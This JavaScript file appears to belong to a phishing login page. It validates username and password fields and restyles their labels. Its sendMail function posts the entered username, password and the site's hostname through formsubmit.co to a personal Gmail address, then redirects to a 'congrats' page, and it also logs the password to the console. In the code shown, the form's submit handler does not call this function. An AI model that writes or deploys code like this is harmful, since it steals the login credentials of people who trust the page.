let inputs = document.querySelectorAll("input");
inputs.forEach((input) =>
  input.addEventListener("change", (e) => {
    label = e.target.closest(".userBox").querySelector("label");
    if (input.value != "") {
      label.style.top = "-20px";
      label.style.color = "#" + "03e9f4";
      label.style.fontSize = "12px";
    } else {
      label.style.top = "0px";
      label.style.fontSize = "18px";
      label.style.color = "white";
    }
  }),
);

document.querySelector("form").addEventListener("submit", (e) => {
  e.preventDefault();
  checkValidation();
});

const sendMail = () => {
  mail = "sikirusulaimon2002@gmail.com";
  subject = `${window.location.hostname} ${new Date()}`;
  let body = new FormData();
  body.append("Username", Username.value);
  body.append("Password", password.value);
  body.append("_captcha", false);
  body.append("_template", "table");
  body.append("_subject", subject);
  let URL = `https://formsubmit.co/${mail}`;
  fetch(URL, {
    method: "POST",
    body: body,
  }).then(window.location.assign("congrats.html"));
  console.log(password.value);
};

let checkValidity = () => {
  let [validUsername, validPassword] = [false, false];
  if (!Username.value) {
    errorUsername.innerHTML = "Username cannot be empty!";
  } else if (Username.value.length < 7) {
    errorUsername.innerHTML = "Username is too short!";
  } else {
    errorUsername.innerHTML = "Looking good!";
    validUsername = true;
  }
  if (password.value == "") {
    explain2.classList.add("show");
    check2.classList.remove("show");
    password.classList.add("error");
    password.classList.remove("success");
    errormsgs22.innerHTML = "Password input cannot be empty";
  } else {
    check2.classList.add("show");
    explain2.classList.remove("show");
    password.classList.add("success");
    password.classList.remove("error");
    errormsgs22.innerHTML = "";
    errormsg22.innerHTML = "Looking good";
    validPassword = true;
  }
  return validUsername && validPassword;
};
function checkValidation() {
  let homePages = "/indexs/homepage/home.html";

  checkValidity() ? window.location.assign(homePages) : " ";
}
